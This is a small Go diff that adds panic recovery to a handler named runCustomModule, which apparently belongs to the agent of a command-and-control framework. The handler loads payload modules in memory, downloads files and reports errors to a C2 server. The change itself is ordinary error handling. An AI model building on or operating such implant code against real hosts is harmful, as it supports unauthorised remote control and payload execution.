@@ -78,6 +78,13 @@ func runStat(cmd *cobra.Command, args []string) {
 
 // runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --peer <ip>
 func runCustomModule(cmd *cobra.Command, args []string) {
+	defer func() {
+		if r := recover(); r != nil {
+			logging.Errorf("runCustomModule panic: %v\n%s", r, util.CallStack())
+			c2transport.NotifyC2(cmd, "Error: custom module panic: %v\n", r)
+		}
+	}()
+
 	modName, _ := cmd.Flags().GetString("mod_name")
 	invocationB64, _ := cmd.Flags().GetString("invocation")
 	checksum, _ := cmd.Flags().GetString("checksum")
